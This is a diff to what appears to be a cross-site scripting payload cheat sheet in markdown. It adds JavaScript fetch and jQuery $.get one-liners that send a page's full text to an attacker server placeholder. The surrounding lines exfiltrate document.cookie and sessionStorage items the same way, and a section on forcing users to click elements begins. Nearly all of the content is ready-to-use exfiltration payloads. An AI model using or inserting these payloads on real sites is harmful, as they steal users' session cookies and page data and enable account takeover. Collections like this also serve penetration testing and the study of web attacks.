@@ -27,6 +27,10 @@ fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCA
 ```javascript
 fetch("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 ```
+### GET TEXT FROM PAGE AND $FETCH *(might be constrained by data length - use .slice() to shorten)*
+```javascript
+fetch("https://$ATTACKER_SERVER?exfil="+document.documentElement.outerText)
+```
 ## JQuery AJAX
 ### GET VALUE FROM LOCAL STORAGE AND $.GET
 ```javascript
@@ -40,6 +44,10 @@ $.get("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCA
 ```javascript
 $.get("https://$ATTACKER_SERVER/?exfil="+document.cookie)
 ```  
+### GET TEXT FROM PAGE AND $.GET *(might be constrained by data length - use .slice() to shorten)*
+```javascript
+$.get("https://$ATTACKER_SERVER?exfil="+document.documentElement.outerText)
+```
 # FORCING ACTIONS
 *For forcing users to preform a certain action. This is tricky because every app is going to be different and thus these will require **modification**.*
 ## CLICK ELEMENT BY ID
